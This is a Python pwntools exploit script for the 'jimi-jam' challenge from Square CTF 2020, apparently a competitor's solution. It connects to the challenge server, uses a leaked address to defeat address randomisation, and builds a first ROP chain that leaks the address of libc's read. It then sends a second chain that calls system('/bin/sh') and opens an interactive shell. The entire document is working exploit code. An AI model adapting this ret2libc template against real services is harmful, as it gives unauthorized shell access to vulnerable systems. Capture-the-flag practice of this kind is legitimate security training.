#!/usr/bin/env python3

from pwn import *

exe = ELF("./jimi-jam")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
        return process(env={"LD_PRELOAD": libc.path})


def main():
#    r = conn()
    r = remote("challenges.2020.squarectf.com", 9000)
    
    r.recvuntil("The tour center is right here! ")
    exe.address = int(r.recv(14), 16) - exe.sym['ROPJAIL']
    log.warn("Executable base address @ 0x%x", exe.address)

    for _ in range(2):
        r.recvline()

    PopRdi = exe.address + 0x00000000000013a3
    puts_plt = 0x00000000000010b0

    payload = b"M"*16
    payload += p64(PopRdi)
    payload += p64(exe.got['read'])
    payload += p64(exe.address + puts_plt)
    payload += p64(exe.sym['main'])

    r.send(payload)

    read = u64(r.recv(6).ljust(8, b"\x00"))
    log.warn("read @ 0x%x", read)

    libc.address = read - libc.sym.read
    
    payload = b"M"*16
    payload += p64(PopRdi)
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(exe.sym['vuln'] + 48)    #ret
    payload += p64(libc.sym.system)

    r.recv(4096)
    r.sendline(payload)
    

    r.interactive()


if __name__ == "__main__":
    main()
